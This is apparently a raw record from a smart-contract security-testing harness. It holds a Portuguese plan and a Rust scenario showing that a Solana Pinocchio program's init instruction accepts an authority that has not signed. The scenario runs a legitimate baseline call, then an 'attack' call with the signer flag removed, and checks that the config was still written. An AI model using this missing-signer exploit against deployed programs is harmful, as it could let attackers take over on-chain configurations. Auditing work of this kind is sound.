attempts.raw:
{
  "plan": "O programa `init` (Pinocchio) espera duas contas: `config` (gravável, com pelo menos 49 bytes) e `authority`. O baseline chama `init` com a autoridade legítima assinando, provando que o cenário está montado corretamente. O ataque repete a mesma chamada, mas remove a assinatura da autoridade (a conta `authority` deixa de ser signer), mantendo a mesma chave pública. O efeito medido é que a config foi inicializada (byte 40 == 1) e a autoridade gravada é a chave fornecida sem assinatura, demonstrando que a operação restrita foi executada sem a assinatura da autoridade.",
  "scenario": "let config_key = Pubkey::new_unique();
let authority_key = Pubkey::new_unique();

let config_data = vec![0u8; 49];
let config_account = account(&env.program_id, &config_data, None);
let authority_account = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_key, true),
];
let ix = env.raw_ix(&[IX_INIT], metas);

let contas = vec![
    (config_key, config_account.clone()),
    (authority_key, authority_account.clone()),
];

let baseline = env.baseline("init legitimo com autoridade assinando", &ix, &contas);

let metas_ataque = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_key, false),
];
let ix_ataque = env.raw_ix(&[IX_INIT], metas_ataque);

let contas_ataque = vec![
    (config_key, config_account),
    (authority_key, authority_account),
];

let r = env.attack("init sem assinatura da autoridade", &ix_ataque, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let config_depois = after(&r, &config_key);
    let dados = config_depois.data();
    let autoridade_gravada = read_pubkey(dados, 8);
    env.effect(
        "config inicializada sem assinatura da autoridade",
        dados[40] == 1 && autoridade_gravada == authority_key,
    );
}"
}

